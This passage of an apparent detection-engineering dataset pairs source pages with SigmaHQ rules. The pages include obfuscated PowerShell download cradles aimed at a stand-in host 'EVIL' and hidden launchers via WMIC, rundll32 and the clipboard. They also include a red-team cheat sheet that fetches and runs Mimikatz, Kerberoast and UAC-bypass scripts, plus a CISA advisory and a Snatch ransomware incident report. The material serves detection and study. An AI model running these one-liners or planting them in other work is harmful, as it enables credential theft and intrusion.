Net.WebRequest:\n\n```\n[IO.StreamReader]::new([Net.WebRequest]::Create('http://EVIL/SCRIPT.ps1').GetResponse().GetResponseStream()).ReadToEnd()\n```\n\n4. `Msxml2.XMLHTTP` COM object:\n\n```\n$c=New-Object -ComObject MsXml2.ServerXmlHttp;$c.Open('GET','http://EVIL/SCRIPT.ps1',0);$c.Send();$c.ResponseText\n```\n\n## C) Operating-System Launcher primitives\n\n1. WMIC:\n\n```\nWMIc  \"pROCESs\"    cALl     crEATE \"PoWErSheLL -WInDowstyLE HIdDEn -NonINTErA  Get-Service\"\n```\n\n2. Rundll32 SHELL32.DLL,ShellExec_RunDLL:\n\n```\nRuNDlL32.exE SHELL32,ShellExec_RunDLL \"POWERsHeLL\" \"-w  1\"  \" -NonInter  \"  \"-CO \"     \"Get-Service\"\n```\n\n3. Cmd + set VAR && Powershell iex VAR:\n\n```\ncmd  /c\"sEt   sqm=Get-Service&&PowErsHeLl  -WinDoWstY hIDDeN -NoniNtERActi  -coMmand   .(   ${E`NV:Com`sp`ec}[4,26,25]-JOIn'')( (  ^&( \\\"{2}{1}{0}\\\"-f'm','eT-ITe','G' ) ( \\\"{1}{0}{2}\\\" -f'v:S','En','qm')  ).\\\"vaL`Ue\\\")\"\n```\n\n4. Cmd + Echo | Powershell - (stdin):\n\n```\nCmD.exE /c\"  ECho/Get-Service  |  PoWeRsheLL  -nOninT  -WindOw hiDDe  -ComM  (gcI 'vARiaBLE:eX*xT').vAluE.InvoKECOmmanD.InVOkESCript($inPut  )\"\n```\n\n5. Cmd + Echo | Clip && Powershell iex clipboard:\n\n```\ncmd   /C\"  ECHO/Get-Service|cLIP&&  POweRsHElL  -Windo  hIDd  -NONINTe -St -ComMaN     . (  \\\"{0}{1}{2}\\\"-f'Ad','d-',(  \\\"{0}{1}\\\" -f 'Ty','pe') ) -AN (  \\\"{0}{2}{4}{1}{3}\\\"-f'P',(\\\"{0}{1}\\\" -f'a','tio'),'res',(  \\\"{0}{1}\\\" -f'n','Core'  ),'ent' )   ;    ^&   (  ( [sTriNG]${ve`R`B`oSepRE`F`eRENce}  )[1,3] +  'x'-joiN'' ) (( [WInDoWS.cLipBoARd]::( \\\"{1}{2}{0}\\\" -f't','Get','Tex').\\\"i`N`VoKE\\\"(  )) )   ; [Windows.Clipboard]::( \\\"{1}{0}\\\" -f'ar','Cle').\\\"I`Nv`OkE\\\"( )\"\n```\n\n## D) Combined Download Cradles\n\n1. PowerShell 3.0+:\n\n```\nIEX (iwr 'http://EVIL/SCRIPT.ps1')\n```\n\n2. Normal download cradle:\n\n```\nIEX (New-Object Net.Webclient).downloadstring(\"http://EVIL/SCRIPT.ps1\")\n```\n\n3. Download Cradle combining *ScriptBlock* + `Invoke-RestMethod`:\n\n```\n[scriptblock]::Create(('http://EVIL/SCRIPT.ps1'|%{(IRM $_)})).Invoke()\n```\n\n4. `Msxml2.XMLHTTP` COM object with Scriptblock:\n\n```\n$c=New-Object -ComObject MsXml2.ServerXmlHttp;$c.Open('GET','http://EVIL/SCRIPT.ps1',0);$c.Send();[scriptblock]::Create($c.ResponseText).Invoke()\n```\n\n5. Minimized `Net.WebRequest` combined with *ScriptBlock* execution:\n\n```\n[scriptblock]::Create([IO.StreamReader]::new([Net.WebRequest]::Create('http://EVIL/SCRIPT.ps1').GetResponse().GetResponseStream()).ReadToEnd()).Invoke()\n```\n\n6. A bit obfuscated `Net.WebClient.DownloadString` with Get-Alias IEX variant:\n\n```\n$w=(New-Object Net.WebClient);$w.(((($w).PsObject.Methods)|?{(Item Variable:\\_).Value.Name-clike'D*g'}).Name).Invoke('http://EVIL/SCRIPT.ps1')|&(DIR Alias:/I*X)\n```\n\n7. Obfuscated `Net.HttpWebRequest` with _Get-Command IEX`:\n\n```\n$h=tYpE,'Ne','t.Htt');$v=((((gET-vAriABLE h).vAlue::Create('http://EVIL/SCRIPT.ps1').PSObject.Methods|?{$_.Name-clike'G*se'}).Invoke()).PSObject.Methods|?{$_.Name-clike'G*eam'}).Invoke();$r='';Try{While($r+=[Char]$v.ReadByte()){}}Catch{};&(GCM *ke-*pr*)$r\n```",
    "sigma_rule": {
      "title": "Obfuscated PowerShell OneLiner Execution",
      "id": "44e24481-6202-4c62-9127-5a0ae8e3fe3d",
      "status": "test",
      "description": "Detects the execution of a specific OneLiner to download and execute powershell modules in memory.",
      "references": [
        "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/",
        "https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38"
      ],
      "author": "@Kostastsale, TheDFIRReport",
      "date": "2022-05-09",
      "modified": "2025-04-16",
      "tags": [
        "attack.defense-evasion",
        "attack.execution",
        "attack.t1059.001",
        "attack.t1562.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\powershell.exe",
          "CommandLine|contains|all": [
            "http://127.0.0.1",
            "%{(IRM $_)}",
            "Invoke"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_download_cradle_obfuscated.yml",
    "id": "336"
  },
  {
    "url": "https://github.com/samratashok/nishang/blob/414ee1104526d7057f9adaeee196d91ae447283e/Shells/Invoke-PowerShellTcpOneLine.ps1",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential Powershell ReverseShell Connection",
      "id": "edc2f8ae-2412-4dfd-b9d5-0c57727e70be",
      "status": "stable",
      "description": "Detects usage of the \"TcpClient\" class. Which can be abused to establish remote connections and reverse-shells. As seen used by the Nishang \"Invoke-PowerShellTcpOneLine\" reverse shell and other.",
      "references": [
        "https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/",
        "https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/",
        "https://github.com/samratashok/nishang/blob/414ee1104526d7057f9adaeee196d91ae447283e/Shells/Invoke-PowerShellTcpOneLine.ps1"
      ],
      "author": "FPT.EagleEye, wagga, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-03-03",
      "modified": "2023-04-05",
      "tags": [
        "attack.execution",
        "attack.t1059.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          },
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            " Net.Sockets.TCPClient",
            ".GetStream(",
            ".Write("
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "In rare administrative cases, this function might be used to check network connectivity"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_reverse_shell_connection.yml",
    "id": "357"
  },
  {
    "url": "https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70",
    "markdown": "# RedTeam_CheatSheet.ps1\n\n## Description:\n\nCollection of PowerShell one-liners for red teamers and penetration testers to use at various stages of testing.\n\n### Invoke-BypassUAC and start PowerShell prompt as Administrator [Or replace to run any other command]\n\n```\npowershell.exe -exec bypass -C \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'\"\n```\n\n### Invoke-Mimikatz: Dump credentials from memory\n\n```\npowershell.exe -exec bypass -C \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds\"\n```\n\n### Import Mimikatz Module to run further commands\n\n```\npowershell.exe -exec Bypass -noexit -C \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')\"\n```\n\n### Invoke-MassMimikatz: Use to dump creds on remote host [replace $env:computername with target server name(s)]\n\n```\npowershell.exe -exec Bypass -C \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1');'$env:COMPUTERNAME'|Invoke-MassMimikatz -Verbose\"\n```\n\n### PowerUp: Privilege escalation checks\n\n```\npowershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1’);Invoke-AllChecks”\n```\n\n### Invoke-Inveigh and log output to file\n\n```\npowershell.exe -exec Bypass -C \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y –NBNS Y –mDNS Y  –Proxy Y -LogOutput Y -FileOutput Y\"\n```\n\n### Invoke-Kerberoast and provide Hashcat compatible hashes\n\n```\npowershell.exe -exec Bypass -C \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-kerberoast -OutputFormat Hashcat\"\n```\n\n### Invoke-ShareFinder and print output to file\n\n```\npowershell.exe -exec Bypass -C \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess|Out-File -FilePath sharefinder.txt\"\n```\n\n### Import PowerView Module to run further commands\n\n```\npowershell.exe -exec Bypass -noexit -C \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')\"\n```\n\n### Invoke-Bloodhound\n\n```\npowershell.exe -exec Bypass -C \"IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound\"\n```\n\n### Find GPP Passwords in SYSVOL\n\n```\nfindstr /S cpassword $env:logonserver\\sysvol\\*.xml\nfindstr /S cpassword %logonserver%\\sysvol\\*.xml (cmd.exe)\n```\n\n### Run Powershell prompt as a different user, without loading profile to the machine [replace DOMAIN and USER]\n\n```\nrunas /user:DOMAIN\\USER /noprofile powershell.exe\n```\n\n### Insert reg key to enable Wdigest on newer versions of Windows\n\n```\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Contro\\SecurityProviders\\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1\n```\n\n## Comment\n\nNew version:\nhttps://gist.github.com/shorefall/cb9733f3aaf666d7db94e69dcd8b1e44",
    "sigma_rule": {
      "title": "Suspicious PowerShell Download and Execute Pattern",
      "id": "e6c54d94-498c-4562-a37c-b469d8e9a275",
      "related": [
        {
          "id": "3b6ab547-8ec2-4991-b9d2-2b06702a48d7",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects suspicious PowerShell download patterns that are often used in malicious scripts, stagers or downloaders (make sure that your backend applies the strings case-insensitive)",
      "references": [
        "https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70",
        "https://www.trendmicro.com/en_us/research/22/j/lv-ransomware-exploits-proxyshell-in-attack.html"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-02-28",
      "modified": "2022-03-01",
      "tags": [
        "attack.execution",
        "attack.t1059.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "IEX ((New-Object Net.WebClient).DownloadString",
            "IEX (New-Object Net.WebClient).DownloadString",
            "IEX((New-Object Net.WebClient).DownloadString",
            "IEX(New-Object Net.WebClient).DownloadString",
            " -command (New-Object System.Net.WebClient).DownloadFile(",
            " -c (New-Object System.Net.WebClient).DownloadFile("
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Software installers that pull packages from remote systems and execute them"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_susp_download_patterns.yml",
    "id": "365"
  },
  {
    "url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a",
    "markdown": "# Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally\n\n**Release Date**: December 13, 2023\n**Alert Code**: AA23-347A\n\n**Related topics**:\nNation-State Cyber Actors, Cyber Threats and Advisories, Securing Networks\n\n---\n\n## SUMMARY\n\nThe U.S. Federal Bureau of Investigation (FBI), U.S. Cybersecurity & Infrastructure Security Agency (CISA), U.S. National Security Agency (NSA), Polish Military Counterintelligence Service (SKW), CERT Polska (CERT.PL), and the UK’s National Cyber Security Centre (NCSC) assess Russian Foreign Intelligence Service (SVR) cyber actors—also known as Advanced Persistent Threat 29 (APT 29), the Dukes, CozyBear, and NOBELIUM/Midnight Blizzard—are exploiting CVE-2023-42793 at a large scale, targeting servers hosting JetBrains TeamCity software since September 2023.\n\nSoftware developers use TeamCity software to manage and automate software compilation, building, testing, and releasing. If compromised, access to a TeamCity server would provide malicious actors with access to that software developer’s source code, signing certificates, and the ability to subvert software compilation and deployment processes—access a malicious actor could further use to conduct supply chain operations.\n\nTo bring Russia’s actions to public attention, the authoring agencies are providing information on the SVR’s most recent compromise to aid organizations in conducting their own investigations and securing their networks, provide compromised entities with actionable indicators of compromise (IOCs), and empower private sector cybersecurity companies to better detect and counter the SVR’s malicious actions.\n\nDownload the PDF version of this report\nDownload the STIX XML\nDownload the STIX JSON\n\n---\n\n## THREAT OVERVIEW\n\nSVR cyber operations pose a persistent threat to public and private organizations’ networks globally. Since 2013, cybersecurity companies and governments have reported on SVR operations targeting victim networks to steal confidential and proprietary information. A decade later, the authoring agencies can infer a long-term targeting pattern aimed at collecting, and enabling the collection of, foreign intelligence.\n\nIn April 2021, the U.S. Government attributed a supply chain operation targeting the SolarWinds information technology company and its customers to the SVR. This attribution marked the discovery that the SVR had, since at least 2018, expanded the range of its cyber operations to include the widespread targeting of information technology companies.\n\nIn this newly attributed operation targeting networks hosting TeamCity servers, the SVR demonstrably continues its practice of targeting technology companies. By choosing to exploit CVE-2023-42793, a software development program, the authoring agencies assess the SVR could benefit from access to victims, particularly by allowing the threat actors to compromise the networks of dozens of software developers.\n\n---\n\n## TECHNICAL DETAILS\n\n### Initial Access - Exploitation\n\nThe SVR started to exploit Internet-connected JetBrains TeamCity servers in late September 2023 using CVE-2023-42793, which enables the insecure handling of specific paths allowing for bypassing authorization, resulting in arbitrary code execution on the server.\n\n### Host Reconnaissance\n\nInitial observations show the SVR used the following basic, built-in commands to perform host reconnaissance:\n\n- `whoami /priv`\n- `whoami /all`\n- `whoami /groups`\n- `whoami /domain`\n- `nltest -dclist`\n- `nltest -dsgetdc`\n- `tasklist`\n- `netstat`\n\n### File Exfiltration\n\nThe authoring agencies have observed the SVR exfiltrating files which may provide insight into the host system’s operating system:\n\n- `C:\\Windows\\system32\\ntoskrnl.exe`\n- SQL Server executable files\n- Visual Studio files\n\n### Interest in SQL Server\n\nBased on the review of the exploitation, the SVR also showed an interest in details of the SQL Server:\n\n- `powershell Compress-Archive -Path \"C:\\Program Files\\Microsoft SQL Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqlmin.dll\" -DestinationPath C:\\Windows\\temp\\1\\sql.zip`\n\n### Tactics Used to Avoid Detection\n\nTo avoid detection, the SVR used a “Bring Your Own Vulnerable Driver” technique to disable or outright kill endpoint detection and response (EDR) and antivirus (AV) software.\n\n---\n\n## MITRE ATT&CK TACTICS AND TECHNIQUES\n\n| Technique Title | ID | Use |\n| --------------- | -- | --- |\n| Gather Victim Network Information: Network Topology | T1590.004 | SVR cyber actors may gather information about the victim’s network topology that can be used during targeting. |\n| Exploit Public-Facing Application | T1190 | SVR cyber actors exploit internet-connected JetBrains TeamCity server using CVE-2023-42793 for initial access. |\n| Command and Scripting Interpreter: PowerShell | T1059.001 | SVR cyber actors used powershell commands to compress Microsoft SQL server .dll files. |\n\n---\n\n## INDICATORS OF COMPROMISE\n\n### File IoCs\n\nGraphicalProton backdoor:\n\n- `01B5F7094DE0B2C6F8E28AA9A2DED678C166D615530E595621E692A9C0240732`\n- `34C8F155601A3948DDB0D60B582CFE87DE970D443CC0E05DF48B1A1AD2E42B5E`\n\n---\n\n## MITIGATIONS\n\n- **Apply available patches** for CVE-2023-42793 issued by JetBrains TeamCity in mid-September 2023.\n- **Monitor the network** for evidence of encoded commands and execution of network scanning tools.\n- **Require use of multi-factor authentication** for all services to the extent possible, particularly for email, virtual private networks, and accounts that access critical systems.\n\n---\n\n## REFERENCES\n\n- Russian Foreign Intelligence Service (SVR) Cyber Operations: Trends and Best Practices for Network Defenders\n- Russian SVR Targets U.S. and Allied Networks",
    "sigma_rule": {
      "title": "Folder Compress To Potentially Suspicious Output Via Compress-Archive Cmdlet",
      "id": "85a8e5ba-bd03-4bfb-bbfa-a4409a8f8b98",
      "related": [
        {
          "id": "71ff406e-b633-4989-96ec-bc49d825a412",
          "type": "similar"
        },
        {
          "id": "daf7eb81-35fd-410d-9d7a-657837e602bb",
          "type": "similar"
        },
        {
          "id": "b7a3c9a3-09ea-4934-8864-6a32cacd98d9",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects PowerShell scripts that make use of the \"Compress-Archive\" Cmdlet in order to compress folders and files where the output is stored in a potentially suspicious location that is used often by malware for exfiltration.\nAn adversary might compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network.\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1074.001/T1074.001.md",
        "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), frack113",
      "date": "2021-07-20",
      "modified": "2022-10-09",
      "tags": [
        "attack.collection",
        "attack.t1074.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "Compress-Archive -Path*-DestinationPath $env:TEMP",
            "Compress-Archive -Path*-DestinationPath*\\AppData\\Local\\Temp\\",
            "Compress-Archive -Path*-DestinationPath*:\\Windows\\Temp\\"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_zip_compress.yml",
    "id": "375"
  },
  {
    "url": "https://thedfirreport.com/2020/06/21/snatch-ransomware/",
    "markdown": "# Snatch Ransomware\n\n**Categories:** Meterpreter, ransomware, rdp, yara\n\n**Published on:** June 21, 2020\n\nAnother RDP brute force ransomware strikes again, this time, Snatch Team! Snatch Team was able to go from brute forcing a Domain Administrator (DA) account via RDP, to running a Meterpreter reverse shell and a RDP proxy via Tor on a Domain Controller (DC), to encrypting all Domain joined systems in under 5 hours.\n\n```image\nAlt: Snatch Ransomware Event UTC\nDescription: The image titled 'Snach Ransomware Event' provides a timeline and flowchart detailing the steps involved in a ransomware attack by the Snatch Team. It outlines the initial access via Remote Desktop Protocol (RDP), lateral movements to various systems, and specific timestamps for actions taken during the attack, such as disabling Windows Defender and deploying the ransomware. The flowchart visually represents the sequence of events, including the use of a TOR executable and the methods used to execute commands on compromised systems.\nTranscription: |\n  Snach Ransomware Event\n  \n  Initial Access\n  RDP 05:15 UTC\n  193.70.12.240\n  ARP used to enumerate environment\n  \n  Lateral Movement RDP to Domain Controller\n  07:57 UTC\n  Recon and Enumeration continued from DC\n  08:08 Fake WMI folder dropped, actually TOR executable and cplXen.exe C2 Dropped\n  08:12 x3.exe loader ran using scheduled task to initiate cplXen.exe\n  09:27 Windows Defender Disabled\n  \n  Lateral Movement to Backup Server\n  09:14 UTC\n  09:28 Ransomware deployed via service and bat files, Go exe of Snatch Ransomware variety\n  sc create utxNEventLogx binPath= \"C:\\\\Windows\\\\safe.exe\" DisplayName= \"Stores and retrieves events that can be viewed in the event viewer. Part of services.exe ytcFXpivNVRx\\\" start= auto\n  ransomware deployed and system rebooted into safemode\n  \n  Lateral Movement to rest of servers and endpoints\n  09:29-09:52 UTC\n  Same process RDP for lateral, disable defender, service, bat, and go\n```\n\nSnatch is a widely known variant due to it causing systems to reboot into safe mode before encrypting the system. SophosLabs has an excellent write up on Snatch which was very similar to what we witnessed.\n\n## Initial Access:\n\nSnatch Team logged into a DA account from 193.70.12.240 around 0515 UTC. Initially with that access they performed a simple `arp -a`.\n\nAt 0753 UTC the threat actors made the next move running `ipconfig` and `quser`. Just minutes later they began lateral movement initiating an RDP session with a DC.\n\n## Lateral Movement and Persistence:\n\nOnce on the DC the threat actor moved quickly deploying a tool set in `C:\\Windows`. This tool set included 2 executables that masqueraded as Windows Management Instrumentation files. One was executed with the following command parameters.\n\n```image\nAlt: Command Parameters\nDescription: The image displays a command line output from a Windows PowerShell or Command Prompt session. It shows details related to a process named 'WmiPrvSystemES.exe', which is being executed with specific parameters. Key information includes the executable path, execution state, handle count, kernel mode time, and installation date, among other system metrics. This output is likely part of an investigation into malicious activity, specifically linked to the Snatch Ransomware incident.\nTranscription: |\n  CommandLine=C:\\Windows\\wmis\\WmiPrvSystemES.exe --nt-service -f C:\\Windows\\wmis\\libeay32.dat\n  CSName=\n  Description=WmiPrvSystemES.exe\n  ExecutablePath=C:\\Windows\\wmis\\WmiPrvSystemES.exe\n  ExecutionState=\n  Handle=84\n  HandleCount=145\n  InstallDate=\n  KernelModeTime=15468750\n  MaximumWorkingSetSize=1380\n  MinimumWorkingSetSize=200\n  Name=WmiPrvSystemES.exe\n  OSName=Microsoft Windows Server 2012 R2\n  OtherOperationCount=5084\n  OtherTransferCount=924894\n  PageFaults=7681\n  PageFileUsage=6720\n```\n\nThe `.dat` file turned out to be a configuration file with the executable being TOR creating an RDP tunnel. (Wouldn’t this be really really slow?)\n\n```image\nAlt: TOR RDP Tunnel\nDescription: The image displays a terminal or command line interface showing configuration details related to a Tor hidden service. Key components include the directory path for the hidden service, ports being used, and client transport settings. Specific entries indicate the use of bridges, along with detailed logs regarding the service's functionality, including paths to executables and error log file locations, which are relevant for analyzing the behavior of a ransomware attack.\nTranscription: |\n  HiddenServiceDir C:\\Windows\\wmis\\CrashReporter\n  ClientOnly 1\n  ExitRelay 0\n  SocksPort 0\n  HiddenServicePort 3389 127.0.0.1:3389\n  UseMicrodescriptors 0\n  HiddenServiceNumIntroductionPoints 6\n  Log notice-err file C:\\Windows\\wmis\\libgcc_s_sjlj-1.dat\n  \n  UseBridges 1\n  ClientTransportPlugin obfs4 exec C:\\Windows\\wmis\\WmiPrvSys.exe\n  \n  Bridge obfs4 158.58.170.145:443 D963ADE44BE5C42BA73C8F066AE4529535ECBC3 cert=E0pqRbVMAOTgkhGO/fiy8LtcY2kcUpzGrA0QwejNRsP1nHty60ihfd/SeU8VFwzaDm8nDQ iat-mode=0\n  Bridge obfs4 185.198.57.215:443 9615531C2517AF54C44C99A69D0D53DAE585 cert=zNqgq8vzF7HnhkCcVnvPLXoaLumk2oYqsS2xVy5tZI44I070iPqjtKPzdtsx95DKLrcA iat-mode=0\n```\n\nThe other executable file in the `wmis` folder was a Go executable of unknown providence potentially related to utorrent capability?\n\nThe next thing they did was create a reverse shell using what we think is Meterpreter. C2 initiated over HTTPS/443 to 91.229.77.161 via `cplXen.exe`.\n\nThe presence of logs indicating the use of named pipe services also increases the likelihood of Meterpreter or possibly Cobaltstrike. We didn’t see any ET Pro signatures fire for this activity but we also didn’t have SSL inspection on at the time.\n\n```image\nAlt: Meterpreter Logs\nDescription: The image displays a log entry detailing the installation of a service named 'bizkaz'. It provides specific information including the service name, the command used to create it, the service type, the start type, and the account under which it runs. This log entry is relevant to understanding the actions taken by the threat actor in the context of the Snatch Ransomware analysis.\nTranscription: |\n  \"A service was installed in the system.\n  Service Name: bizkaz\n  Service File Name: cmd.exe /c echo bizkaz > \\\\\\\\.\\\\pipe\\\\bizkaz\n  Service Type: user mode service\n  Service Start Type: demand start\n  Service Account: LocalSystem\"\n```\n\nA separate executable was then dropped for stealthy persistence of `cplXen.exe`. `X3.exe` is a loader that uses the 3 DLLs (which are ini files) below to run `cplXen`.\n\n```image\nAlt: X3 Loader\nDescription: The image depicts a code analysis interface, specifically a string search result from a binary file named 'x3.exe'. It shows lines of code with various Unicode strings, including references to DLL files like 'jd4ob7162ns.dll' and 'kb05987631s.dll'. Additionally, there are indications of function calls related to creating scheduled tasks using 'schtasks' commands, suggesting the executable's role in persistence mechanisms for the Snatch ransomware. Warning symbols accompany certain code lines, potentially indicating points of interest or concern within the code.\nTranscription: |\n  String Search [CodeBrowser: snatch/x3.exe]\n  Help\n  \n  Location      Label      Code Unit\n  -------------------------------------------------\n  0044345d      A          CALL dword ptr [ECX + 0x7c]\n  00443410      A          PUSH EAX\n  00443458      A          PUSH EAX\n  0044461c      A          u_kb05987631s.dll 0044...\n  00444640      A          u_fw0a53482aa.dll\n  0044468c      A          unicode u\"jd4ob7162ns.dll\"\n  00444674      A          u_K_schtasks /Create /RU SYSTEM /SC ONSTART /TN \"Regular Idle Maintenance\" /TR \"\\\"\n  0044473c      A          unicode u\" && exit\"\n  00444750      A          unicode u\"cmd.exe\"\n  0044476c      A          unicode u\"K_schtasks /Create /RU SYSTEM /SC DAILY /ST 00:00 /TN \"Regular Idle Maintenance\" /TR \"\\\"\n  00444780      A          ds \"Error\"\n  004447b0      A          s_Runtime_error_at 00000000\n  00444c4c      A          ds \"oleaut32.dll\"\n  00444dec      A          ds \"SysFreeString\"\n  00444cfc      A          ds \"SysReAllocStringLen\"\n```\n\n```\njd4ob7162ns.dll: C:\\windows\\system32\\cplXen.exe /F\nfw0a53482aa.dll: 443\nkb05987631s.dll: 91.229.77.161\n```\n\nTwo Scheduled Tasks were created to launch the loader, which in turn persists the loading of `cplXen.exe`.\n\n```image\nAlt: Scheduled Tasks\nDescription: The image displays a section of a task scheduler interface, showing two entries labeled 'Regular Idle Maintenance.' Both tasks are marked as 'Ready' with one scheduled to execute 'At 12:00 AM every day' and the other 'At system startup.' This image is relevant to the discussion of scheduled tasks created by a malicious executable, indicating potential persistence mechanisms used by the Snatch ransomware.\nTranscription: |\n  - Regular Idle Maintenance\n    - Status: Ready\n    - Trigger: At 12:00 AM every day\n  \n  - Regular Idle Maintenance\n    - Status: Ready\n    - Trigger: At system startup\n```\n\n`x3.exe` had a very low VT hit ratio. If anyone wants to investigate this further feel free to contact us to get the file or get it on MISP/VT.\n\n```image\nAlt: VT Hit Ratio\nDescription: The image displays a malware analysis report for the executable file 'x3.exe'. It includes a detection score of '3 out of 73' by various antivirus engines, with three engines flagging it as malicious or unsafe. The report outlines the file size (308.00 KB), the date of the report (2020-06-14), and a hash of the file. Additionally, it lists the detection results from multiple antivirus products, indicating which engines detected the file as malicious or undetected, and includes a community score section.\nTranscription: |\n  3 / 73\n  3 engines detected this file\n  b9e4299239880961a88875e1265db0ec62a8c4d6baf7a5de6f02f4c31fcdb1\n  x3.exe\n  peexe\n  Size: 308.00 KB\n  Date: 2020-06-14 18:22:07 UTC\n  2 days ago\n  \n  DETECTION          DETAILS         BEHAVIOR         COMMUNITY\n  SecureAge APEX     Malicious\n  Cylance            Unsafe\n  Ad-Aware           Undetected\n  AhnLab-V3         Undetected\n  ALYac              Undetected\n  Arcabit           Undetected\n  Avast-Mobile       Undetected\n  BitDefenderTheta   Undetected\n  Acronis            Undetected\n  AegisLab          Undetected\n  Alibaba           Undetected\n  Antiy-AVL         Undetected\n  AVG               Undetected\n  \n  Gen:NN.ZelphiF.34128.tOW@aGT11pc\n```\n\n## Action on Objectives:\n\nAbout a half hour after successful C2 we see this:\n\n```image\nAlt: C2 Success\nDescription: The image displays a technical log output, specifically detailing an event related to the action of attaching a database within a Windows environment. It contains various fields such as event data, event ID, keywords, and messages that indicate the database engine's interaction with a specific file located in the AppData directory. This log is relevant for analyzing the actions taken by the Snatch ransomware, showcasing the methods used to access and manipulate sensitive data.\nTranscription: |\n  eventdata.data\n      esentutl, 1424, 2, C:\\Users\\\n      00, [8] 0.000, [9] 0.000, [10] 0.000, [11] 0.000, [12] 0.000, 1.0\n  system.channel\n      Application\n  system.computer\n      326\n  system.eventID\n      326\n  system.eventRecordID\n      4000\n  system.keywords\n      0x800000000000\n  system.level\n      4\n  system.message\n      \"esentutl (1424) The database engine attached a database (2, C:\\Users\\\n      \\AppData\\Roaming\\ditsnap\\ntds.dit). (Time=0 seconds)\n      Internal Timing Sequence: [1] 0.000, [2] 0.000, [3] 0.000, [4] 0.000, [5] 0.000, [6] 0.000, [7] 0.000, [8] 0.000, [9] 0.000, [10] 0.000, [11] 0.000, [12] 0.000.\n      Saved Cache: 1 0\"\n  system.providerName\n      ESENT\n```\n\nWe can conclude that ditsnap was most likely run on the DC to obtain a copy of `ntds.dit` by creating a snapshot.\n\nForty-five minutes later Snatch Team had their first blood. They RDP’ed into the backup server, turned off Windows Defender, and executed `safe.exe`. They did this for every machine in the domain and within 15 minutes all machines were ransomed including the DCs. All machines rebooted into safe mode before encrypting causing all logging and remote tools to fail (Damn you safe mode!).\n\n```image\nAlt: Snatch Access and Lateral Movement\nDescription: The image is a diagram illustrating the process of access and lateral movement by the Snatch ransomware group. It shows the flow of connections starting from the Internet to various hosts within a network. Key elements include the initial RDP (Remote Desktop Protocol) entry point, which leads to an exposed host, then to a domain controller and a backup server. The diagram indicates multiple pivots to other hosts that were 